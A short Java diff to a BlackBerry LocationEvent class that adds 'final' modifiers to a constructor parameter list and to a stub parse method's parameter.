@@ -9,7 +9,7 @@ package blackberry.event;
 
 public class LocationEvent extends Event {
 
-    public LocationEvent(int actionId, byte[] confParams) {
+    public LocationEvent(final int actionId, final byte[] confParams) {
         super(Event.EVENT_LOCATION, actionId, confParams);
     }
 
@@ -18,7 +18,7 @@ public class LocationEvent extends Event {
 
     }
 
-    protected boolean parse(byte[] confParams) {
+    protected boolean parse(final byte[] confParams) {
         // TODO Auto-generated method stub
         return false;
     }
